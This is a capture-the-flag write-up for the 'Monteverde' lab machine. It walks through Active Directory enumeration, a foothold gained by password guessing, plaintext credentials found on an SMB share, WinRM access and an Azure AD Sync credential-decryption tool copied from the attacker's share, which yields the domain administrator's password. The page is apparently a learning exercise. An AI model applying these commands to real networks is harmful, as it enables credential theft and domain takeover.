---
layout: default
---


# Monteverde

# Enumeration

Scan with nmap reported the following ports opened:

```bash
PORT      STATE SERVICE        REASON
53/tcp    open  domain         syn-ack
88/tcp    open  kerberos-sec   syn-ack
135/tcp   open  msrpc          syn-ack
139/tcp   open  netbios-ssn    syn-ack
389/tcp   open  ldap           syn-ack
445/tcp   open  microsoft-ds   syn-ack
464/tcp   open  kpasswd5       syn-ack
593/tcp   open  http-rpc-epmap syn-ack
636/tcp   open  ldapssl        syn-ack
5985/tcp  open  wsman          syn-ack
9389/tcp  open  adws           syn-ack
49667/tcp open  unknown        syn-ack
49673/tcp open  unknown        syn-ack
49674/tcp open  unknown        syn-ack
49676/tcp open  unknown        syn-ack
49697/tcp open  unknown        syn-ack
52040/tcp open  unknown        syn-ack
```

## Getting the domain name

```bash
┌──(kali㉿kali)-[~/machines/windows/monteverde]
└─$ crackmapexec smb 10.10.10.172  
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
```

Domain name is `MEGABANK.LOCAL` and machine name is `MONTEVERDE`

## DNS

- No unexpected DNS records found

```bash
┌──(kali㉿kali)-[~/machines/windows/monteverde]
└─$ dig ANY MEGABANK.LOCAL @10.10.10.172

; <<>> DiG 9.18.16-1-Debian <<>> ANY MEGABANK.LOCAL @10.10.10.172
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 34138
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 6, AUTHORITY: 0, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;MEGABANK.LOCAL.                        IN      ANY

;; ANSWER SECTION:
MEGABANK.LOCAL.         600     IN      A       10.10.10.172
MEGABANK.LOCAL.         3600    IN      NS      monteverde.MEGABANK.LOCAL.
MEGABANK.LOCAL.         3600    IN      SOA     monteverde.MEGABANK.LOCAL. hostmaster.MEGABANK.LOCAL. 58 900 600 86400 3600
MEGABANK.LOCAL.         600     IN      AAAA    dead:beef::95d6:873a:9fa5:ee9
MEGABANK.LOCAL.         600     IN      AAAA    dead:beef::18d
MEGABANK.LOCAL.         600     IN      AAAA    dead:beef::2dbe:bf36:8e26:db76

;; ADDITIONAL SECTION:
monteverde.MEGABANK.LOCAL. 1200 IN      A       10.10.10.172
monteverde.MEGABANK.LOCAL. 1200 IN      AAAA    dead:beef::95d6:873a:9fa5:ee9
monteverde.MEGABANK.LOCAL. 1200 IN      AAAA    dead:beef::18d
```

- Transfer zone failed as well

```bash
┌──(kali㉿kali)-[~/machines/windows/monteverde]
└─$ dig axfr MEGABANK.LOCAL @10.10.10.172

; <<>> DiG 9.18.16-1-Debian <<>> axfr MEGABANK.LOCAL @10.10.10.172
;; global options: +cmd
; Transfer failed.
```

## SMB

- Need credentials

```bash
┌──(kali㉿kali)-[~/machines/windows/monteverde]
└─$ crackmapexec smb 10.10.10.172 -u '%' -p '%' --shares
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\%:% STATUS_LOGON_FAILURE
```

```bash
┌──(kali㉿kali)-[~/machines/windows/monteverde]
└─$ smbclient -L \\\\10.10.10.172\\ 
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

## RPC

- Null session allowed

```bash
┌──(kali㉿kali)-[~/machines/windows/monteverde]
└─$ rpcclient -U '%' 10.10.10.172
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

## LDAP

- We can query ldap, but we cannot use ldapdomaindump

### Groups

```bash
Group: 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\Administrator                                                                                                                                                          
                                                                                                                                                                                                                                          
Group: 'Trading' (RID: 2610) has member: MEGABANK\dgalanos                                                                                                                                                                                  
                                                                                                                                                                                                                                        
Group: 'Domain Guests' (RID: 514) has member: MEGABANK\Guest                                                                                                                                                                                
                                                                                                                                                                                                                                       
Group: 'HelpDesk' (RID: 2611) has member: MEGABANK\roleary
                                                                                                                                                                                                                                        
Group: 'Azure Admins' (RID: 2601) has member: MEGABANK\Administrator                                                                                                                                                                        
Group: 'Azure Admins' (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2
Group: 'Azure Admins' (RID: 2601) has member: MEGABANK\mhope
                                                                                                                                                                                                                                      
Group: 'Domain Users' (RID: 513) has member: MEGABANK\Administrator                                                                                                                                                                         
Group: 'Domain Users' (RID: 513) has member: MEGABANK\krbtgt
Group: 'Domain Users' (RID: 513) has member: MEGABANK\AAD_987d7f2f57d2
Group: 'Domain Users' (RID: 513) has member: MEGABANK\mhope
Group: 'Domain Users' (RID: 513) has member: MEGABANK\SABatchJobs
Group: 'Domain Users' (RID: 513) has member: MEGABANK\svc-ata
Group: 'Domain Users' (RID: 513) has member: MEGABANK\svc-bexec
Group: 'Domain Users' (RID: 513) has member: MEGABANK\svc-netapp
Group: 'Domain Users' (RID: 513) has member: MEGABANK\dgalanos
Group: 'Domain Users' (RID: 513) has member: MEGABANK\roleary
Group: 'Domain Users' (RID: 513) has member: MEGABANK\smorgan
                                                                                                                                                                                                                                      
Group: 'Operations' (RID: 2609) has member: MEGABANK\smorgan
```

Since we cannot get nothing from LDAP or RPC, we will try bruteforce to get password from a user.

# Foothold

Trying username as the password seems to be a good bet. 

```bash
┌──(kali㉿kali)-[~/machines/windows/monteverde]
└─$ crackmapexec smb 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' 
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

From here we will enumerate other services, but now authenticated. Enumerating users shares we find a share with users folders and a password.

```bash
┌──(kali㉿kali)-[~/machines/windows/monteverde]
└─$ crackmapexec smb 10.10.10.172  -u 'SABatchJobs' -p 'SABatchJobs' --shares
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ 
SMB         10.10.10.172    445    MONTEVERDE       [+] Enumerated shares
SMB         10.10.10.172    445    MONTEVERDE       Share           Permissions     Remark
SMB         10.10.10.172    445    MONTEVERDE       -----           -----------     ------
SMB         10.10.10.172    445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.10.10.172    445    MONTEVERDE       azure_uploads   READ            
SMB         10.10.10.172    445    MONTEVERDE       C$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       E$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.10.10.172    445    MONTEVERDE       NETLOGON        READ            Logon server share 
SMB         10.10.10.172    445    MONTEVERDE       SYSVOL          READ            Logon server share 
SMB         10.10.10.172    445    MONTEVERDE       users$          READ
```

```bash
┌──(kali㉿kali)-[~]
└─$ smbclient \\\\10.10.10.172\\users$ -U MEGABANK.LOCAL/SABatchJobs%'SABatchJobs' 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan  3 14:12:48 2020
  ..                                  D        0  Fri Jan  3 14:12:48 2020
  dgalanos                            D        0  Fri Jan  3 14:12:30 2020
  mhope                               D        0  Fri Jan  3 14:41:18 2020
  roleary                             D        0  Fri Jan  3 14:10:30 2020
  smorgan                             D        0  Fri Jan  3 14:10:24 2020
```

```bash
smb: \mhope\> ls
  .                                   D        0  Fri Jan  3 14:41:18 2020
  ..                                  D        0  Fri Jan  3 14:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 14:40:23 2020

                31999 blocks of size 4096. 28979 blocks available
```

From RPC we saw that user mhope is part of Azure Admins group, so its a good user to try this password:

```bash
┌──(kali㉿kali)-[~/machines/windows/monteverde]
└─$ crackmapexec smb 10.10.10.172 -u 'mhope' -p '4n0therD4y@n0th3r$'       
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$
```

Trying with winrm we got a pwn3d!, meaning that we can connect to the machine:

```bash
┌──(kali㉿kali)-[~/machines/windows/monteverde]
└─$ crackmapexec winrm 10.10.10.172 -u 'mhope' -p '4n0therD4y@n0th3r$'                      
SMB         10.10.10.172    5985   MONTEVERDE       [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
HTTP        10.10.10.172    5985   MONTEVERDE       [*] http://10.10.10.172:5985/wsman
WINRM       10.10.10.172    5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)
```

# Privilege escalation

Once inside the machine we can see a **.Azure** folder:

```bash
*Evil-WinRM* PS C:\users\mhope> dir

    Directory: C:\users\mhope

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/27/2023   2:55 PM                .Azure
d-r---         1/3/2020   5:24 AM                3D Objects
d-r---         1/3/2020   5:24 AM                Contacts
d-r---         1/3/2020   5:47 AM                Desktop
d-r---         1/3/2020   5:24 AM                Documents
d-r---       10/27/2023   3:34 PM                Downloads
d-r---         1/3/2020   5:24 AM                Favorites
d-r---         1/3/2020   5:24 AM                Links
d-r---         1/3/2020   5:24 AM                Music
d-r---         1/3/2020   5:24 AM                Pictures
d-r---         1/3/2020   5:24 AM                Saved Games
d-r---         1/3/2020   5:24 AM                Searches
d-r---         1/3/2020   5:24 AM                Videos
```

Now we can try to use token and information from that directory to escalate privilege, but none of that will work. In the users directory we can see another user `AAD_987d7f2f57d2` . Checking at he information we have about this user we can obtain that:

- This user is also part of Azure Admins
- This user is related with sync stuff

```bash
[+] General info:
    User Name   :    AAD_987d7f2f57d2
    Full Name   :    AAD_987d7f2f57d2
    Home Drive  :    
    Dir Drive   :    
    Profile Path:    
    Logon Script:    
    Description :    Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
```

There might be something interesting about azure and synchronization.  A quick search on google about `azure ad sync privilege escalation` will gives us what we are looking for. To exploit this we have to transfer the files from this repository https://github.com/VbScrub/AdSyncDecrypt/ to the victim.

- We copy the .exe and .dll in a writable route

```bash
*Evil-WinRM* PS C:\Users\mhope\Documents> copy \\10.10.14.12\share\mcrypt.dll .
*Evil-WinRM* PS C:\Users\mhope\Documents> copy \\10.10.14.12\share\AdDecrypt.exe .
*Evil-WinRM* PS C:\Users\mhope\Documents> dir

    Directory: C:\Users\mhope\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/13/2020   3:11 PM          14848 AdDecrypt.exe
-a----        1/12/2020  12:33 PM         334248 mcrypt.dll
```

- Now we go to the folder  `C:\Program Files\Microsoft Azure AD Sync\Bin` , and execute the transfered binary from here. The result is the admin password:

```bash
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> C:\Users\mhope\Documents\AdDecrypt.exe -FullSQL

======================
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
======================

Opening database connection...
Executing SQL commands...
Closing database connection...
Decrypting XML...
Parsing XML...
Finished!

DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@in4dminyeah!
Domain: MEGABANK.LOCAL
```

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
megabank\administrator
```